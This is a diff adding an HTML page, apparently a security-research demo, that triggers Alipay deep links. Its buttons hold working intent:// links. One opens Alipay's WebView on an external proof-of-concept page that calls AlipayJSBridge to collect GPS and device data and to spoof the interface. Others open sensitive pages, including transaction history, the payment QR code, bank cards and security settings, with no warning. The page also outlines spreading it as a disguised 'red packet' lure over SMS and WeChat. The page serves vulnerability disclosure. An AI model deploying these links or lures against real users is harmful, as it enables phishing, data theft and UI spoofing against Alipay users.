@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Research - DeepLink Trigger Demo</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,sans-serif;text-align:center;padding:0;background:#0a0a0f;color:#e0e0e8;min-height:100vh}
+.hdr{background:linear-gradient(135deg,#1a0a0a,#0a0a1a);padding:24px 16px;border-bottom:1px solid #2a2a3a}
+.hdr h1{font-size:20px;font-weight:700;margin-bottom:8px;background:linear-gradient(135deg,#ff4444,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hdr p{color:#888;font-size:13px}
+.warn{background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);border-radius:8px;padding:12px 16px;margin:16px;font-size:12px;color:#ff8888;text-align:left;line-height:1.6}
+.warn strong{color:#ff4444}
+.section{padding:16px;text-align:left}
+.section h2{font-size:16px;margin-bottom:12px;color:#e0e0e8}
+.section p{font-size:12px;color:#888;margin-bottom:12px;line-height:1.5}
+.btn{display:block;width:calc(100% - 32px);margin:8px 16px;padding:14px;border-radius:10px;text-decoration:none;font-size:15px;color:#fff;font-weight:600;text-align:center;border:none;cursor:pointer;transition:opacity .2s}
+.btn:hover{opacity:.85;text-decoration:none}
+.btn-critical{background:linear-gradient(135deg,#ff4444,#cc0000)}
+.btn-high{background:linear-gradient(135deg,#ff6b35,#cc4400)}
+.btn-info{background:linear-gradient(135deg,#4488ff,#2266cc)}
+.btn-medium{background:linear-gradient(135deg,#9966ff,#6633cc)}
+.code{background:#0d1117;border:1px solid #2a2a3a;border-radius:6px;padding:10px;margin:8px 16px;font-family:'SF Mono',monospace;font-size:11px;color:#888;word-break:break-all;overflow-x:auto}
+.tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;margin-right:4px}
+.tag-crit{background:rgba(255,68,68,.2);color:#ff4444}
+.tag-high{background:rgba(255,107,53,.2);color:#ff6b35}
+.footer{padding:24px 16px;text-align:center;color:#555;font-size:11px;border-top:1px solid #1a1a28}
+.footer a{color:#4488ff}
+</style>
+</head><body>
+
+<div class="hdr">
+  <h1>Alipay DeepLink Attack Demo</h1>
+  <p>Security Research Trigger Page | innora.ai</p>
+</div>
+
+<div class="warn">
+  <strong>SECURITY RESEARCH DEMONSTRATION</strong><br>
+  This page simulates how an attacker would distribute malicious DeepLinks via SMS/WeChat/QQ.
+  In a real attack, this page would be disguised as a "red packet" or "prize claim" page.
+  <br><br>
+  Buttons below trigger Alipay DeepLinks. On a device with Alipay installed, clicking will open Alipay directly.
+  <br><br>
+  <strong>Full report:</strong> <a href="https://innora.ai/zfb/" style="color:#4488ff">innora.ai/zfb</a>
+</div>
+
+<div class="section">
+  <h2><span class="tag tag-crit">CRITICAL</span> Attack Chain A: JSBridge Exploitation</h2>
+  <p>Opens Alipay WebView and loads our PoC page which calls AlipayJSBridge APIs to collect GPS, device info, and demonstrate UI spoofing.</p>
+</div>
+
+<a class="btn btn-critical"
+   href="intent://platformapi/startapp?appId=20000067&url=https%3A%2F%2Finnora.ai%2Fzfb%2Fpoc%2Fverify.html#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Chain A: JSBridge PoC (Android Chrome)
+</a>
+
+<div class="code">
+  alipays://platformapi/startapp?appId=20000067&url=https://innora.ai/zfb/poc/verify.html
+</div>
+
+<div class="section">
+  <h2><span class="tag tag-high">HIGH</span> Attack Chain B: Zero-Interaction DeepLinks</h2>
+  <p>These DeepLinks open sensitive Alipay pages directly. No additional warning is shown.</p>
+</div>
+
+<a class="btn btn-high"
+   href="intent://platformapi/startapp?appId=20000003#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Transaction History (appId=20000003)
+</a>
+
+<a class="btn btn-high"
+   href="intent://platformapi/startapp?appId=20000116#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Transfer Contacts (appId=20000116)
+</a>
+
+<a class="btn btn-info"
+   href="intent://platformapi/startapp?appId=20000123#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Payment QR Code (appId=20000123)
+</a>
+
+<a class="btn btn-info"
+   href="intent://platformapi/startapp?appId=20000032#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Yu'E Bao Balance (appId=20000032)
+</a>
+
+<a class="btn btn-medium"
+   href="intent://platformapi/startapp?appId=20000052#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Security Settings (appId=20000052)
+</a>
+
+<a class="btn btn-medium"
+   href="intent://platformapi/startapp?appId=20000193#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end">
+   Bank Card Management (appId=20000193)
+</a>
+
+<div class="section" style="margin-top:16px">
+  <h2>How This Works</h2>
+  <p>
+    1. Attacker distributes this page via SMS/WeChat/QQ (disguised as "red packet")<br>
+    2. Victim clicks a button in their mobile browser<br>
+    3. Browser triggers <code>intent://</code> scheme which opens Alipay<br>
+    4. For Chain A: Alipay loads attacker's page in WebView with AlipayJSBridge injected<br>
+    5. For Chain B: Alipay navigates directly to sensitive page, no extra warning
+  </p>
+</div>
+
+<div class="footer">
+  <p>Innora AI Security Research | <a href="https://innora.ai/zfb/">Full Report</a> | feng@innora.ai</p>
+  <p>This is a security research demonstration. Use responsibly.</p>
+</div>
+
+</body></html>
